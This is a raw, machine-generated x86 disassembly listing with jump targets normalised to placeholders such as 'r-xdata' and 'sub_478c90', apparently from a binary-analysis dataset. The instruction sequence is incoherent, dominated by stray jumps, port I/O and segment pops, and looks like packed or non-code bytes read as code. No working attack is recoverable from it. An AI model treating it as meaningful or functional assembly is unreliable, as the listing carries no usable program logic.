xchg edx eax
sub al 0x92
xor eax 0xeb7b7b41
jmp r-xdata
jmp r-xdata
je r-xdata
jpo r-xdata
mov bh [ ecx ]
xchg edx eax
add [ ebx + 0x7b ] edi
jpo r-xdata
cmovge edi [ ebx + 0x7b ]
inc [ esp + esi * 2 + 0x7b6158ff ]
jpo r-xdata
jpo r-xdata
xchg ebx eax
adc ecx [ eax + 0x2c281e0f ]
cmp eax 0x7fe89223
jpo r-xdata
popfd
inc ebx
jpo r-xdata
xchg edx eax
and [ ecx + 0x7b ] edx
jpo r-xdata
mov ebp 0x84869f92
test bl ch
jmp r-xdata
sub esi esi
[ ebx ]
jmp r-xdata
adc [ 0xffffffffbf2ef21d ] ecx
jmp r-xdata
pop eax
dec eax
test eax 0xbd2ef21d
and [ ecx ] edx
adc dl [ edx + 0x7b7b5121 ]
jmp r-xdata
or eax 0xbf2ef21d
jg r-xdata
stosd [ edi ]
jpo r-xdata
jmp r-xdata
jmp r-xdata
mov edi 0x74bbfe77
jmp [ ebx ]
sub [ ebx + edi * 2 + 0x7b ] dh
sub_478c90
push edx
jpo r-xdata
out dx eax
jpo r-xdata
and dl [ ecx ]
setb [ esi - 0x147b7b70 ]
jmp r-xdata
and dh dl
aas
jpo r-xdata
fwait
inc esi
pop edx
dec ebp
call edx
rcl [ ebp - 0x656d7b7c ] cl
test [ esi ] cl
ja r-xdata
xchg esi edi
mov ebx 0x76f0ff74
jpo r-xdata
pop edi
dec edi
inc edx
pop es
pop edi
dec ebx
je r-xdata
aas
cmpsd [ esi ] [ edi ]
and edx [ edx - 0x7b7b79a7 ]
jmp r-xdata
sub al 0x92
push cs
jae r-xdata
xchg ebp eax
test [ edx + edx * 4 - 0x7b7b7b66 ] al
jmp r-xdata
xchg edx eax
dec eax
mov ebx 0xa33ef21d
and edx [ ecx ]
push ss
jpo r-xdata
test ch ch
mov ebp 0xa5f01211
and bl [ 0xfffffffff0cf26f2 ]
mov [ 0xffffffff848b6592 ] eax
test bl ch
jmp r-xdata
jpo r-xdata
jpo r-xdata
jpo r-xdata
lodsd [ esi ]
xchg edx eax
inc edi
ja r-xdata
test [ esp + eax * 4 - 0x14141415 ] al
jmp r-xdata
adc edi [ edx + 0x7b ]
jpe r-xdata
sub eax [ ebp + ebp + 0x3b00f873 ]
jpo r-xdata
sbb eax 0x23a73ef2
xchg edx eax
pop ecx
xchg [ esp + eax * 4 + 0x2ff3ebeb ] al
mov di 0xe992
xchg [ esp + eax * 4 - 0x8b1415 ] eax
jg r-xdata
sbb eax 0x23a33ef2
adc [ esi ] edx
jpo r-xdata
jecxz r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
jpo r-xdata
call [ ebx ]
jpe r-xdata
add [ esi + 0x47928484 ] 0x62
jpo r-xdata
ja r-xdata
jmp r-xdata
mov edi 0xeb848485

jpe r-xdata
cmp al 0x92
jmp r-xdata
imul esi edx 0x3e
div [ esi ]
inc ecx
jpo r-xdata
jpo r-xdata
scasd [ edi ]
and edx [ ecx ]
nop edx esi
je r-xdata
[ eax + 0x46 ]
jpo r-xdata
xchg edx eax
sahf
test [ ebx + ebp * 8 - 0x6d141415 ] al
push es
inc ebp
jpo r-xdata
xchg edx eax
mov [ esp + eax * 4 - 0x14141415 ] es
jmp r-xdata
test [ eax + ecx + 0x732d843b ] al
dec eax
jpo r-xdata
xchg edx eax
cmp eax [ ecx + 0x7b ]
test ch cl
mov edi 0xf07b7b7b
jpo r-xdata
dec [ esi + 0x6d ]
dec esi
insd
jg r-xdata
mov [ 0x67ea9222 ] eax
jpo r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
salc
push edi
jpo r-xdata
je r-xdata
jpo r-xdata
cmp esp [ ebx - 0xe ]
jg r-xdata
jmp r-xdata
mov eax 0xeb7b7b7c
jmp r-xdata
test [ ebx - 0x7b7b65c5 ] dl
jmp r-xdata
sbb eax 0x21a52ef2
jpo r-xdata
jpo r-xdata
sub eax [ esi + ecx + 0x716a92a7 ]
jpo r-xdata
cli
test [ esp + eax * 4 - 0x9141415 ] al
xchg ebp eax
lahf
test [ esp + eax * 4 + 0x2d843b08 ] al
jae r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
daa
jpo r-xdata
outsd
push ebx
jpo r-xdata
je r-xdata
jpo r-xdata
mov eax [ esp + eax * 4 - 0x14141415 ]
jmp r-xdata
jpo r-xdata
jpo r-xdata
adc [ ebx - 0x6e ] edi
jpo r-xdata
cli
pop edx
jpo r-xdata
test [ edx + edx * 4 ] bh
xchg edx eax
jmp r-xdata
sub edx [ esi - 0x68077b7c ]
adc [ bx ] ebx
xchg edx eax
jmp 0xffffffffebc30af0
jpo r-xdata
jpo r-xdata
jpo r-xdata
inc ecx
jmp r-xdata
js r-xdata
pop ebx
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
jmp r-xdata
jmp r-xdata
adc [ edx + 0x7b7b536f ] 0xffffffeb
test [ ebx + 0x7b7b5165 ] edx
clc
jpo r-xdata
jmp r-xdata
jpo r-xdata
test al bh
jmp r-xdata
pop ds
xchg esi eax
test [ edx + edx * 4 - 0x7b7b69cc ] al
jmp r-xdata
sub bh [ ebx + 0x7b ]
jpo r-xdata
adc [ edx + 0x7b7b536f ] 0xffffffeb
imul esi edx 0x3e
test dh bh
mov ebx 0x456efe74
jpo r-xdata
jpo r-xdata
push 0x927b7b46
sub [ eax + 0x3b938484 ] ecx
0xbbfe8484 0xfe74
outsb
inc ebp
add al 0x8b
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
stosd [ edi ]
jpo r-xdata
jmp r-xdata
adc ecx [ edx ]
sub eax 0xf9924bcb
pop edi
jpo r-xdata
dec [ ebx - 0x6d7b7b73 ]
xchg [ esi - 0x416c7b7c ] dl
insd
jpo r-xdata
xchg ebx eax
jmp r-xdata
jpo r-xdata
xchg ebx eax
test al bh
cmp [ edx + 0x74 ] 0xffffffff
mov [ ebp + 0x7b ] gs
jpo r-xdata
xchg ebx eax
mov gs [ ebx + 0x7b ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
pop ebx
xchg edx eax
les ecx [ ebp - 0xd147b7c ]
xchg [ es : ebp + ebp + 0x6d8d927f ] eax
xchg ebx eax
jpo r-xdata
adc eax 0xf21db3f0
xchg ebx eax
pop ds
mov al [ esp + eax * 4 + 0x7bb3fdf2 ]
jpo r-xdata
jmp r-xdata
sbb [ edx ] edx
push ds
mov esp 0x171f833e
pop ss
push ebp
mov esp 0x171f873e
js r-xdata
mov edi 0x911b4677
xchg ebx eax
daa
rcl [ eax - 0x40077b7c ] 0x6b
xchg edx eax
cmpsb [ esi ] [ edi ]
xchg ebx eax
test [ ebx + ebp * 8 + 0x7b486092 ] al
test [ ebx + ebp * 8 - 0x7b60ed6d ] al
sub [ eax + 0x7b ] esi
jpo r-xdata
mov [ 0x1d7b7b77 ] al
push es
fwait
dec eax
test [ 0x249906f2 ] bl
sbb eax 0x119306f2
push ss
xchg ebx eax
and cl [ edx - 0x7c0f7b7c ]
adc esi [ esi + 0x2c1b6ac1 ]
lds ebp [ edi - 0x6d848485 ]
cmpsd [ esi ] [ edi ]
add [ esp + eax * 4 + 0x3ef21deb ] 0x93
and edx [ ecx ]
adc eax 0x913ef21d
and edx [ ecx ]
nop edx esi
xchg edi eax
and edx [ ecx ]
adc dl [ edx - 0x7b7b7111 ]
jmp r-xdata
nop
test [ ebx + ebp * 8 + 0x2b0d84eb ] al
test [ 0xffffffff9f0e844f ] cl
jge r-xdata
sub eax [ ebx ]
mov [ ebx - 0x7b709a6e ] fs
test [ edi + ebx ] ch
clc
add [ edx + edx * 4 - 0x7b7b62f2 ] 0xffffffeb
jmp r-xdata
sub edx [ edx - 0x7b7b640c ]
jmp r-xdata
jmp r-xdata
or ch [ 0xfffffffff9924bcb ]
pop edi
imul esi esi 0x3f
pop edi
imul edx [ edx - 0x7b7b78b6 ] 0xffffffeb
jmp r-xdata
dec [ ebp + ebp * 2 + 0x275a7b7b ]
and al 0x1d
push es
xchg ecx eax
xchg edx eax
arpl [ edi - 0x14147b7c ] bx
jmp r-xdata
and al 0x1d
push es
xchg ebx eax
adc [ esi ] edx
sbb eax 0x23913ef2
adc [ edi ] ecx
sbb eax 0x23973ef2
adc [ edx ] edx
xchg edx eax
out dx eax
mov es [ esp + eax * 4 + 0x1debebeb ]
push es
xchg edx eax
ficomp [ edi + 0x7b ]
jpo r-xdata
xchg [ eax - 0x14147b7c ] dl
test [ 0x4f0d842b ] cl
test [ esi ] cl
lahf
jmp r-xdata
test bl ch
dec eax
mov al [ 0x7b71c492 ]
add ecx [ ebx - 0x7b709a6e ]
jpo r-xdata
pop ss
jpo r-xdata
jmp r-xdata
sub al 0x84
maxps xmm6 [ ebx - 0x10 ]
add [ esp + ebp - 0x7b7c07e1 ] 0xffffff92
push cs
popfd
test [ ebx + ebp * 8 - 0x6dd41415 ] al
fbstp [ ebx + edi * 2 + 0x7b ]
test [ edx - 0x7b7b697a ] dl
xchg ebx eax
mov esi 0x787b7b6d
mov ebx 0x9bf4922b
test [ ebx + ebp * 8 - 0xde21415 ] al
dec [ edx + 0x5b ]
jpo r-xdata
mov cl 0x92
lea eax [ esp + eax * 4 - 0x14141415 ]
dec eax
mov al [ 0xffffffff8496c792 ]
test bl ch
jmp r-xdata
push es
jpo r-xdata
xchg edx eax
je r-xdata
scasd [ edi ]
adc bl [ ss : eax ]
or [ edx + 0x7b7b7cd7 ] edx
jmp r-xdata
test [ ebx ] ch
jpo r-xdata
mov ebx 0x93bdf02b
mov eax 0xf8848498
mov edi 0x5f3ff277
imul edi esi 0xffffffbb
je r-xdata
mov eax 0x2bebebeb
test [ esi ] cl
arpl [ edx + 0x7b7b7d4c ] dx
clc
pop ss
xlat
jl r-xdata
jmp r-xdata
pop es
pop edi
inc [ eax - 0x77b7b73 ]
pop edi
jpo r-xdata
or [ ebp + 0x7f88484 ] 0x5f
sub eax [ esi + ecx + 0x7d4c9263 ]
jpo r-xdata
je r-xdata
les esi [ ecx + 0x7b ]
jpo r-xdata
xlat
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
mov eax 0x7b7cfe74
jpo r-xdata
jmp r-xdata
[ ebx + ebx * 2 + 0x7b ]
jpo r-xdata
pop esp
pop ebx
jpo r-xdata
xchg edx eax
pop eax
pop ss
jmp r-xdata
jmp r-xdata
test [ ebx + ebp - 0x7b73896e ] al
test [ ebx + 0x7b7b56eb ] dl
sub [ ebp + ebp * 8 + 0x7b7b7bd7 ] al
sub al 0x28
xchg edx eax
pop esi
xchg edi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
push es
jae r-xdata
dec [ ebx - 0x6d7b7b80 ]
jge r-xdata
and edx [ ecx ]
or al 0x1d
lahf
and edx [ ecx ]
push ds
sbb eax 0x239d3ef2
adc [ 0xfffffffff21db3f0 ] edx
idiv dh
mov eax [ eax + 0x2b928484 ]
xchg esi eax
test [ eax + edi * 8 + 0x1f116797 ] al
pop ss
jmp r-xdata
inc eax
jpo r-xdata
sub_4790fb
leave
push edx
jpo r-xdata
test [ ebx + ebp * 8 + 0x5ffff6eb ] al
out dx eax
jpo r-xdata
sub edx [ edx - 0x7b7b6f7a ]
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ ebx + ebp * 8 - 0x6cc10de3 ] al
adc [ ebx - 0x7c ] edi
sub eax 0x97919237
test [ ebx + edx * 4 - 0x7b7b75e1 ] al
std
mov bl 0x7b
jpo r-xdata
push es
sbb eax 0x23913ef2
adc [ edi ] ecx
sbb eax 0x23973ef2
adc [ edx ] edx
xchg edx eax
out dx eax
mov es [ esp + eax * 4 + 0x1debebeb ]
push es
and al 0x1d
push es
xchg ecx eax
xchg edx eax
arpl [ edi - 0x14147b7c ] bx
jmp r-xdata
mov [ 0x1d7b7b77 ] al
push es
fwait
dec eax
test [ 0x249906f2 ] bl
sbb eax 0x119306f2
push ss
and edx [ ecx ]
adc eax 0x913ef21d
and edx [ ecx ]
nop edx esi
xchg edi eax
and edx [ ecx ]
adc dl [ edx - 0x7b7b7111 ]
jmp r-xdata
xchg ebx eax
and cl [ edx - 0x7c0f7b7c ]
adc esi [ esi + 0x2c1b6ac1 ]
lds ebp [ edi - 0x6d848485 ]
cmpsd [ esi ] [ edi ]
add [ esp + eax * 4 + 0x3ef21deb ] 0x93
xchg ebx eax
adc [ esi ] edx
and al 0x1d
push es
mov cl 0x92
lea eax [ esp + eax * 4 - 0x14141415 ]
dec eax
mov al [ 0xffffffff8496c792 ]
test bl ch
jmp r-xdata
push es
sub_479269
das
add [ esp + eax * 4 + 0x7b750192 ] 0x7b
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
push es
xchg ebx eax
adc [ esi ] edx
and al 0x1d
push es
xchg ecx eax
xchg edx eax
arpl [ edi - 0x14147b7c ] bx
jmp r-xdata
and al 0x1d
push es
sub_479270
jpo r-xdata
stosd [ edi ]
xchg edx eax
inc edi
pop edx
jpo r-xdata
jmp r-xdata
test eax 0x84923692
test bl ch
jmp r-xdata
sbb eax 0x23a33ef2
xchg edx eax
pop es
ja r-xdata
jmp r-xdata
mov bh 0x21
adc [ ecx ] ecx
sbb eax 0x23ab3ef2
sbb eax 0x92a93ef2
xchg edx eax
test [ ebx + ebp * 8 - 0x338b1415 ] al
push 0xffffff92
fld [ esp + eax * 4 - 0x6c14147c ]
loop r-xdata
jmp r-xdata
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp sub_4793bf
jpo r-xdata
test eax 0x7b5ca692
jpo r-xdata
sbb eax 0xf0c32ef2
stosd [ edi ]
xchg edx eax
mov dl [ eax + 0x7b ]
jpo r-xdata
clc
and [ edi ] 0x92
das
inc edx
jpo r-xdata
push es
jmp sub_479415
adc [ edi ] edi
idiv dh
pop ds
test [ esp + eax * 4 - 0x596dd4d3 ] al
mov [ esp + eax * 4 - 0xde21415 ] eax
aas
jmp r-xdata
jmp r-xdata
mov edx 0x4d459279
jpo r-xdata
jmp r-xdata
jmp r-xdata
xchg ebx eax
adc [ esi ] edx
and al 0x1d
push es
xchg ecx eax
xchg edx eax
arpl [ edi - 0x14147b7c ] bx
jmp r-xdata
and al 0x1d
push es
pop edi
and edx [ edx - 0x7b7b775a ]
jmp r-xdata
sub eax 0x89a6922b
test [ ebx + ebp * 8 + 0x3ff21deb ] al
xchg edx eax
jmp r-xdata
pop edi
and dl [ ecx ]
or eax esi
mov [ 0x5d26f21d ] al
jmp r-xdata
lahf
push ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx - 0x14147b7c ] edx
jmp r-xdata
sbb eax 0x208326f2
sbb eax 0x928126f2
sub_479286
mov eax 0x7b554b92
jpo r-xdata
jmp sub_479265
jmp r-xdata
jpo r-xdata
sub [ ebp + 0x7b138484 ] dl
jae r-xdata
jpo r-xdata
pop ebp
jmp r-xdata
jpo r-xdata
mov edx 0x4d459279
jpo r-xdata
pop edi
and dl [ ecx ]
or eax esi
mov [ 0x5d26f21d ] al
jmp r-xdata
sbb eax 0xf0c32ef2
stosd [ edi ]
xchg edx eax
mov dl [ eax + 0x7b ]
sub_47928f
cmp eax 0x732b930b
jpo r-xdata
test eax 0xf21d1511
lahf
clc
mov edi 0x9d7a923b
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test bl ch
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub [ ebp + 0x7b138484 ] dl
jae r-xdata
jpo r-xdata
pop ebp
jmp r-xdata
jpo r-xdata
mov edx 0x4d459279
jpo r-xdata
pop edi
and dl [ ecx ]
or eax esi
mov [ 0x5d26f21d ] al
jmp r-xdata
sbb eax 0xf0c32ef2
stosd [ edi ]
xchg edx eax
mov dl [ eax + 0x7b ]
sub_4792e3
cmp eax 0x830e844f
[ edi ]
idiv [ esi ]
stosd [ edi ]
xchg edx eax
inc edi
pop edx
jpo r-xdata
test eax 0x84923692
test bl ch
jmp r-xdata
sbb eax 0x23a33ef2
xchg edx eax
pop es
ja r-xdata
mov bh 0x21
adc [ ecx ] ecx
sbb eax 0x23ab3ef2
sbb eax 0x92a93ef2
xchg edx eax
test [ ebx + ebp * 8 - 0x338b1415 ] al
push 0xffffff92
fld [ esp + eax * 4 - 0x6c14147c ]
loop r-xdata
jmp r-xdata
jpo r-xdata
jmp sub_4793bf
jpo r-xdata
test eax 0x7b5ca692
jpo r-xdata
sbb eax 0xf0c32ef2
stosd [ edi ]
xchg edx eax
mov dl [ eax + 0x7b ]
jpo r-xdata
clc
and [ edi ] 0x92
das
inc edx
jpo r-xdata
jmp sub_479415
adc [ edi ] edi
idiv dh
pop ds
test [ esp + eax * 4 - 0x596dd4d3 ] al
mov [ esp + eax * 4 - 0xde21415 ] eax
aas
jmp r-xdata
jmp r-xdata
mov edx 0x4d459279
jpo r-xdata
jmp r-xdata
jmp r-xdata
pop edi
and edx [ edx - 0x7b7b775a ]
jmp r-xdata
sub eax 0x89a6922b
test [ ebx + ebp * 8 + 0x3ff21deb ] al
xchg edx eax
jmp r-xdata
pop edi
and dl [ ecx ]
or eax esi
mov [ 0x5d26f21d ] al
jmp r-xdata
lahf
push ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx - 0x14147b7c ] edx
jmp r-xdata
sbb eax 0x208326f2
sbb eax 0x928126f2
sub_479345
je r-xdata
dec [ esi + 0x2c7b7b7b ]
dec edi
test [ esi ] cl
xor edx 0x3e
stosd [ edi ]
idiv [ esi ]
stosd [ edi ]
xchg edx eax
inc edi
pop edx
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test eax 0x84923692
test bl ch
jmp r-xdata
sbb eax 0x23a33ef2
xchg edx eax
pop es
ja r-xdata
test [ esp + esi * 2 + 0x7b7b8eff ] al
jpo r-xdata
mov bh 0x21
adc [ ecx ] ecx
sbb eax 0x23ab3ef2
sbb eax 0x92a93ef2
xchg edx eax
test [ ebx + ebp * 8 - 0x338b1415 ] al
jmp r-xdata
jpo r-xdata
je r-xdata
xchg edx eax
jns r-xdata
jmp sub_4793bf
jpo r-xdata
test eax 0x7b5ca692
jpo r-xdata
sbb eax 0xf0c32ef2
stosd [ edi ]
xchg edx eax
mov dl [ eax + 0x7b ]
jpo r-xdata
clc
and [ edi ] 0x92
das
inc edx
jpo r-xdata
push 0xffffff92
fld [ esp + eax * 4 - 0x6c14147c ]
loop r-xdata
jmp sub_479415
adc [ edi ] edi
idiv dh
pop ds
test [ esp + eax * 4 - 0x596dd4d3 ] al
mov [ esp + eax * 4 - 0xde21415 ] eax
aas
jmp r-xdata
jmp r-xdata
mov edx 0x4d459279
jpo r-xdata
jmp r-xdata
jmp r-xdata
pop edi
and edx [ edx - 0x7b7b775a ]
jmp r-xdata
sub eax 0x89a6922b
test [ ebx + ebp * 8 + 0x3ff21deb ] al
xchg edx eax
jmp r-xdata
pop edi
and dl [ ecx ]
or eax esi
mov [ 0x5d26f21d ] al
jmp r-xdata
lahf
push ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
test [ edx - 0x14147b7c ] edx
jmp r-xdata
sbb eax 0x208326f2
sbb eax 0x928126f2
sub_47935e
adc [ ebx + 0x21b72ef2 ] ecx
adc [ ecx ] ecx
sbb eax 0x23ab3ef2
sbb eax 0x92a93ef2
xchg edx eax
test [ ebx + ebp * 8 - 0x338b1415 ] al
push 0xffffff92
fld [ esp + eax * 4 - 0x6c14147c ]
loop r-xdata
jmp sub_4793bf
jpo r-xdata
jmp sub_479415
adc [ edi ] edi
idiv dh
pop ds
test [ esp + eax * 4 - 0x596dd4d3 ] al
mov [ esp + eax * 4 - 0xde21415 ] eax
aas
pop edi
and edx [ edx - 0x7b7b775a ]
jmp r-xdata
sub eax 0x89a6922b
test [ ebx + ebp * 8 + 0x3ff21deb ] al
sub_4793e7
xchg edi eax
dec eax
mov ebx 0xa692a948
pop esp
jpo r-xdata
idiv [ edi ]
pop edi
pop edi
jmp r-xdata
0xeb84848c 0xebeb
jmp r-xdata
pop edi
je r-xdata
jmp r-xdata
push es
xchg edi eax
and [ 0xfffffffff0432ef2 ] ebx
test [ 0xfffffffff09506f2 ] ebx
jmp r-xdata
mov ebx 0x93bdf02b
mov edx 0xf88484a4
mov edi 0x5f3ff277
arpl si di
mov ebx 0x547dff74
jpo r-xdata
test [ edx - 0x14147b7c ] edx
jmp r-xdata
sbb eax 0x19928dfe
dec ebp
jpo r-xdata
dec edi
and [ 0xfffffffff07326f2 ] bl
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
js r-xdata
r-xdata
clc
pop es
pop edi
pop edi
jpo r-xdata
push ecx
xchg esp eax
jmp r-xdata
movsd [ edi ] [ esi ]
xchg edx eax
or edx [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
test bl ch
sbb eax 0xf07326f2
inc [ eax - 0x78484ab ]
add al 0x73
jpo r-xdata
jmp r-xdata
jg r-xdata
lodsd [ esi ]
sbb eax 0xf0412ef2
sbb [ 0xfffffffff08b06f2 ] 0xffffffab
xchg edx eax
aad 0x92
test [ ebx + ebp * 8 - 0xde21415 ] al
jge r-xdata
jpo r-xdata
inc eax
cmp al 0x7f
jpo r-xdata
jmp r-xdata
clc
mov edx 0x8dfe1d79
xchg edx eax
sbb [ ebp + 0x7b ] ecx
jpo r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
jae r-xdata
jmp r-xdata
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
jmp r-xdata
jpo r-xdata
je r-xdata
adc edi [ edi + 0x7a ]
jg r-xdata
sub al 0xf6
jpo r-xdata
xchg [ ss : edx ] ebp
test [ esi ] cl
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
sub al 0x84
sub eax 0x38cc7473
push edi
xchg edx eax
mov cl 0x97
test [ ebx + ebp * 8 - 0x6bdeec15 ] al
sub_479415
sbb eax 0x24b106f2
clc
pop es
pop edi
pop edi
jpo r-xdata
jmp r-xdata
sbb eax 0xf07326f2
inc [ eax - 0x78484ab ]
add al 0x73
jpo r-xdata
xchg edx eax
mov cl 0x7f
jpo r-xdata
sbb eax 0x1d7b7b51
push es
mov cl 0x24
movsd [ edi ] [ esi ]
xchg edx eax
or edx [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
clc
mov edx 0x8dfe1d79
xchg edx eax
sbb [ ebp + 0x7b ] ecx
jpo r-xdata
lodsd [ esi ]
sbb eax 0xf0412ef2
sbb [ 0xfffffffff08b06f2 ] 0xffffffab
xchg edx eax
aad 0x92
test [ ebx + ebp * 8 - 0xde21415 ] al
jge r-xdata
jae r-xdata
jmp r-xdata
sbb eax 0x19928dfe
dec ebp
jpo r-xdata
dec edi
and [ 0xfffffffff07326f2 ] bl
test bl ch
jmp r-xdata
xchg esp eax
jmp r-xdata
je r-xdata
jmp r-xdata
jg r-xdata
jg r-xdata
inc eax
cmp al 0x7f
jpo r-xdata
sub al 0xf6
jpo r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
xchg [ ss : edx ] ebp
test [ esi ] cl
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
sub al 0x84
sub eax 0x38cc7473
push edi
xchg edx eax
mov cl 0x97
test [ ebx + ebp * 8 - 0x6bdeec15 ] al
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
jpo r-xdata
adc edi [ edi + 0x7a ]
sub_479421
mov esp 0x9b3ef21d
and edx [ ecx ]
add edx [ edx + 0x7b7b4b99 ]
jmp r-xdata
mov cl 0x7f
jpo r-xdata
clc
pop es
pop edi
pop edi
jpo r-xdata
jmp r-xdata
sbb eax 0xf07326f2
inc [ eax - 0x78484ab ]
add al 0x73
jpo r-xdata
sbb eax 0x1d7b7b51
push es
mov cl 0x24
xchg edx eax
movsd [ edi ] [ esi ]
xchg edx eax
or edx [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
jpo r-xdata
jmp r-xdata
clc
mov edx 0x8dfe1d79
xchg edx eax
sbb [ ebp + 0x7b ] ecx
jpo r-xdata
lodsd [ esi ]
sbb eax 0xf0412ef2
sbb [ 0xfffffffff08b06f2 ] 0xffffffab
xchg edx eax
aad 0x92
test [ ebx + ebp * 8 - 0xde21415 ] al
jge r-xdata
jae r-xdata
jmp r-xdata
sbb eax 0x19928dfe
dec ebp
jpo r-xdata
dec edi
and [ 0xfffffffff07326f2 ] bl
test bl ch
jmp r-xdata
xchg esp eax
jmp r-xdata
je r-xdata
jmp r-xdata
jg r-xdata
jg r-xdata
inc eax
cmp al 0x7f
jpo r-xdata
sub al 0xf6
jpo r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
xchg [ ss : edx ] ebp
test [ esi ] cl
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
sub al 0x84
sub eax 0x38cc7473
push edi
xchg edx eax
mov cl 0x97
test [ ebx + ebp * 8 - 0x6bdeec15 ] al
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
jpo r-xdata
adc edi [ edi + 0x7a ]
sub_479450
mov eax 0xfaebebeb
xchg edi eax
jns r-xdata
sbb eax 0x11492ef2
pop ds
and [ 0x114f2ef2 ] ebx
sbb [ ecx ] esp
sbb eax 0x114d2ef2
sbb al 0x1d
push es
jpo r-xdata
sbb eax 0x19928dfe
dec ebp
jpo r-xdata
dec edi
and [ 0xfffffffff07326f2 ] bl
jpo r-xdata
and [ ss : ebx + 0x7b ] edi
sub [ 0xffffffff9273421d ] ch
xchg esp eax
jmp r-xdata
movsd [ edi ] [ esi ]
xchg edx eax
or edx [ ebx + edi * 2 + 0x7b ]
jmp r-xdata
clc
pop es
pop edi
pop edi
jpo r-xdata
jmp r-xdata
inc edx
jae r-xdata
pop ds
pop edi
pop edi
jpo r-xdata
jmp r-xdata
jg r-xdata
sbb eax 0xf07326f2
inc [ eax - 0x78484ab ]
add al 0x73
jpo r-xdata
sbb eax 0x1d7b7b51
push es
mov cl 0x24
xchg edx eax
mov cl 0x7f
ja r-xdata
adc [ edx + 0x7b ] esp
jpo r-xdata
aas
pop edi
pop edi
inc eax
cmp al 0x7f
jpo r-xdata
jpo r-xdata
jns r-xdata
jpo r-xdata
0xeb84848c 0xebeb
jmp r-xdata
pop edi
je r-xdata
pop edi
outsd
cmpsb [ esi ] [ edi ]
movsb [ edi ] [ esi ]
test [ eax + ecx * 2 + 0x5f3ff2bb ] al
outsd
je r-xdata
idiv dh
daa
xchg [ esp + eax * 4 + 0x7dbc922b ] al
jpo r-xdata
jmp r-xdata
clc
mov edx 0x8dfe1d79
xchg edx eax
sbb [ ebp + 0x7b ] ecx
jpo r-xdata
sub ebx [ 0x1d793cf0 ]
js r-xdata
xchg edx eax
aas
push ecx
jpo r-xdata
xchg edi eax
and [ 0xfffffffff0432ef2 ] ebx
test [ 0xfffffffff09506f2 ] ebx
push es
jmp r-xdata
mov ebx 0x93bdf02b
mov edx 0xf88484a4
mov edi 0x5f3ff277
arpl si di
mov ebx 0x547dff74
jpo r-xdata
sbb eax 0x743d3842
[ edi ]
jmp r-xdata
lodsd [ esi ]
sbb eax 0xf0412ef2
sbb [ 0xfffffffff08b06f2 ] 0xffffffab
xchg edx eax
aad 0x92
test [ ebx + ebp * 8 - 0xde21415 ] al
jge r-xdata
jae r-xdata
jmp r-xdata
sbb eax 0x675f3f78
je r-xdata
jmp r-xdata
sub esi [ esp + ecx * 8 + 0x7c ]
r-xdata
jpo r-xdata
test bl ch
jmp r-xdata
test eax 0x7b5ca692
jpo r-xdata
adc edi [ edi + 0x7a ]
je r-xdata
jmp r-xdata
jmp r-xdata
jg r-xdata
xchg edx eax
jmp r-xdata
sub al 0xf6
jpo r-xdata
push ecx
xchg edx eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xchg [ ss : edx ] ebp
test [ esi ] cl
and al 0x96
sub al 0x92
lds esi [ ecx + 0x7b ]
jpo r-xdata
sub al 0x84
sub eax 0x38cc7473
push edi
xchg edx eax
mov cl 0x97
test [ ebx + ebp * 8 - 0x6bdeec15 ] al
test [ edx - 0x14147b7c ] edx
jmp r-xdata
sbb eax 0x208326f2
sbb eax 0x928126f2
sub_4794c6
adc [ edi ] edx
and [ 0x1d552ef2 ] ebx
dec ebx
adc [ edx ] eax
and [ 0x11492ef2 ] ebx
pop ds
and [ 0x114f2ef2 ] ebx
sbb [ ecx ] esp
sbb eax 0x114d2ef2
sbb al 0x1d
push es
xchg edi eax
and [ 0xfffffffff0432ef2 ] ebx
test [ 0xfffffffff09506f2 ] ebx
lodsd [ esi ]
sbb eax 0xf0412ef2
